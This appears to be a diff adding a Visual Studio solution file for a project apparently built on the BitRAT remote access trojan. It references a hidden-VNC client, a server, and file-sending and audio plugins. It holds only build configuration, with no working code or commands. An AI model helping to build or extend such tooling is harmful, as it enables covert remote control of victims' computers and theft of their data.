@@ -1,0 +1,35 @@
+﻿
+Microsoft Visual Studio Solution File, Format Version 12.00
+# Visual Studio Version 17
+VisualStudioVersion = 17.9.34728.123
+MinimumVisualStudioVersion = 10.0.40219.1
+Project("{9A19103F-16F7-4668-BE54-9A1E7A4F7556}") = "HVNC", "BitRAT-HVNC\Client\HVNC.vcxproj", "{FFE5AD77-8AF4-4A3F-8CE7-6BDC45565F07}"
+EndProject
+Project("{9A19103F-16F7-4668-BE54-9A1E7A4F7556}") = "Server", "Server\Server.csproj", "{7767C300-5FD5-4A5D-9D4C-59559CCE48A3}"
+EndProject
+Project("{9A19103F-16F7-4668-BE54-9A1E7A4F7556}") = "SendFile", "Plugin\SendFile\SendFile.csproj", "{8DE42DA3-BE99-4E7E-A3D2-3F65E7C1ABCE}"
+EndProject
+Project("{9A19103F-16F7-4668-BE54-9A1E7A4F7556}") = "Audio", "Plugin\Audio\Audio.csproj", "{464B9C6F-8377-44BB-B516-1FD086A67754}"
+EndProject
+Global
+	GlobalSection(SolutionConfigurationPlatforms) = preSolution
+		Debug|Any CPU = Debug|Any CPU
+		Release|Any CPU = Release|Any CPU
+	EndGlobalSection
+	GlobalSection(ProjectConfigurationPlatforms) = postSolution
+		{FFE5AD77-8AF4-4A3F-8CE7-6BDC45565F07}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
+		{FFE5AD77-8AF4-4A3F-8CE7-6BDC45565F07}.Debug|Any CPU.Build.0 = Debug|Any CPU
+		{FFE5AD77-8AF4-4A3F-8CE7-6BDC45565F07}.Release|Any CPU.ActiveCfg = Release|Any CPU
+		{FFE5AD77-8AF4-4A3F-8CE7-6BDC45565F07}.Release|Any CPU.Build.0 = Release|Any CPU
+		{464B9C6F-8377-44BB-B516-1FD086A67754}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
+		{464B9C6F-8377-44BB-B516-1FD086A67754}.Debug|Any CPU.Build.0 = Debug|Any CPU
+		{464B9C6F-8377-44BB-B516-1FD086A67754}.Release|Any CPU.ActiveCfg = Release|Any CPU
+		{464B9C6F-8377-44BB-B516-1FD086A67754}.Release|Any CPU.Build.0 = Release|Any CPU
+	EndGlobalSection
+	GlobalSection(SolutionProperties) = preSolution
+		HideSolutionNode = FALSE
+	EndGlobalSection
+	GlobalSection(ExtensibilityGlobals) = postSolution
+		SolutionGuid = {6161EA05-9C5C-4946-BEAE-28C4AAB7ACFA}
+	EndGlobalSection
+EndGlobal
